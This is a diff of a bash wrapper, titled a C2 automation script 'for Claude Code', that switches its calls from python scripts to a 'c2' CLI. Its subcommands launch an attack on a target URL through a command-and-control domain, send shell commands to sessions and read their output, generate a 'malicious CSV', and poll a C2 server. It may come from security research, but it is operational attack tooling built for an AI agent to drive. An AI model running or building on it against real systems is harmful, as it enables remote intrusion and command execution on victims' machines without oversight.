@@ -1,6 +1,6 @@
 #!/bin/bash
 # C2 Automation Script for Claude Code
-# This script wraps the attacker_shell.py commands for easier automation
+# This script wraps the c2 CLI commands for easier automation
 
 set -e
 
@@ -14,11 +14,6 @@ if [ -f set_env_vars.sh ]; then
     source set_env_vars.sh
 fi
 
-# Activate venv if it exists
-if [ -d "../venv" ]; then
-    source ../venv/bin/activate
-fi
-
 ACTION="${1:-help}"
 shift || true
 
@@ -30,7 +25,7 @@ case "$ACTION" in
             echo "Usage: c2.sh attack <target_url>"
             exit 1
         fi
-        python3 src/attack_client.py --target "$TARGET" --c2-domain "${DOMAIN:-c2.bt-research-control.com}"
+        uv run c2 attack "$TARGET" --c2-domain "${DOMAIN:-c2.bt-research-control.com}"
         ;;
 
     send)
@@ -41,7 +36,7 @@ case "$ACTION" in
             echo "Usage: c2.sh send <command> <session_id>"
             exit 1
         fi
-        python3 src/attacker_shell.py send "$COMMAND" --session "$SESSION"
+        uv run c2 send "$COMMAND" --session "$SESSION"
         ;;
 
     receive)
@@ -51,17 +46,17 @@ case "$ACTION" in
             echo "Usage: c2.sh receive <session_id>"
             exit 1
         fi
-        python3 src/attacker_shell.py receive --session "$SESSION"
+        uv run c2 receive --session "$SESSION"
         ;;
 
     generate)
         # Generate malicious CSV
-        python3 src/attacker_shell.py generate-csv "$@"
+        uv run c2 generate-csv "$@"
         ;;
 
     status)
         # Check C2 server status
-        curl -s "http://${EC2_IP:-localhost}:8080/api/output?session=status" && echo ""
+        uv run c2 status
         ;;
 
     help|*)
